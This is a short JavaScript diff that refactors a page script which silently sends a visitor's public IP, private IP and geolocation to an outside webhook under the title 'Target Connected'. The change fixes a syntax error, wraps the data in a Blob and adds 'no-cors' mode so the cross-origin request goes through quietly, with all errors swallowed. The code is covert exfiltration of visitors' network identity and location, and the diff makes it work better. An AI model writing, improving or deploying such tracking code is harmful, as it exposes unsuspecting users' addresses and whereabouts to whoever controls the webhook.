@@ -51,20 +51,21 @@
             } catch(e) {}
 
             try {
+                const payload = JSON.stringify({
+                    embeds: [{
+                        title: "Target Connected",
+                        color: 0xff0000,
+                        fields: [
+                            {name: "public ip", value: pub, inline: false},
+                            {name: "private ip", value: priv, inline: false},
+                            {name: "geolocation", value: geo, inline: false}
+                        ]
+                    }]
+                });
                 await fetch(WEBHOOK, {
                     method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({
-                        embeds: [{
-                            title": "Target Connected",
-                            color: 0xff0000,
-                            fields: [
-                                {name: "public ip", value: pub, inline: false},
-                                {name: "private ip", value: priv, inline: false},
-                                {name: "geolocation", value: geo, inline: false}
-                            ]
-                        }]
-                    })
+                    mode: "no-cors",
+                    body: new Blob([payload], {type: "application/json"})
                 });
             } catch(e) {}
         }
